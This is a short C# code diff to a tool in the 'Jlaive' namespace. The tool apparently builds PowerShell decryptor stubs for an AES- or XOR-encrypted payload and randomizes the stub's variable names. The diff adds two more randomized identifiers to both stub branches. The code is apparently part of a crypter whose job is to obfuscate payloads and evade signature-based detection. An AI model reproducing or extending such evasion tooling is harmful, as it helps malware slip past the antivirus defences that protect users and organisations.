@@ -11,6 +11,8 @@ namespace Jlaive
     {
         public static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
         {
+            string tbsreversed_var = RandomString(5, rng);
+            string tbs_var = RandomString(5, rng);
             string contents_var = RandomString(5, rng);
             string lastline_var = RandomString(5, rng);
             string payload_var = RandomString(5, rng);
@@ -26,6 +28,8 @@ namespace Jlaive
                 string stubcode = GetEmbeddedString("Jlaive.Resources.AESStub.ps1");
                 stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
                 stubcode = stubcode.Replace("DECRYPTION_IV", Convert.ToBase64String(iv));
+                stubcode = stubcode.Replace("tbsreversed_var", tbsreversed_var);
+                stubcode = stubcode.Replace("tbs_var", tbs_var);
                 stubcode = stubcode.Replace("contents_var", contents_var);
                 stubcode = stubcode.Replace("lastline_var", lastline_var);
                 stubcode = stubcode.Replace("payload_var", payload_var);
@@ -41,6 +45,8 @@ namespace Jlaive
             {
                 string stubcode = GetEmbeddedString("Jlaive.Resources.XORStub.ps1");
                 stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
+                stubcode = stubcode.Replace("tbsreversed_var", tbsreversed_var);
+                stubcode = stubcode.Replace("tbs_var", tbs_var);
                 stubcode = stubcode.Replace("contents_var", contents_var);
                 stubcode = stubcode.Replace("lastline_var", lastline_var);
                 stubcode = stubcode.Replace("payload_var", payload_var);
